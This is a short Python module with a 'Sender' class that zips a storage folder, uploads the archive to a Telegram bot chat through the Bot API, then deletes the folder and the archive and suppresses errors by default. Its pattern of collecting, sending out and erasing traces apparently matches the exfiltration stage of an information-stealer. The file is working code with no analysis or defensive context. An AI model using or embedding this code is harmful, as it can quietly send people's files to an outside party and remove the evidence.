from os import remove
from requests import post
from shutil import make_archive, rmtree


class Sender:

    def __init__(self, *args):

        for index, variable in enumerate(["zip_name", "storage_path", "storage_folder", "token", "user_id", "errors"]):
            self.__dict__.update({variable: args[index]})

    def __create_archive(self):

        make_archive(f"{self.storage_path}{self.zip_name}", "zip", f"{self.storage_path}{self.storage_folder}")

    def __send_archive(self):

        with open(f"{self.storage_path}{self.zip_name}.zip", "rb") as file:

            post(
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data={
                    "chat_id": self.user_id
                },
                files={
                    "document": file
                }
            )

        file.close()

    def __delete_files(self):

        rmtree(f"{self.storage_path}{self.storage_folder}")
        remove(f"{self.storage_path}{self.zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:

            if self.errors is True:
                print(f"[SENDER]: {repr(e)}")
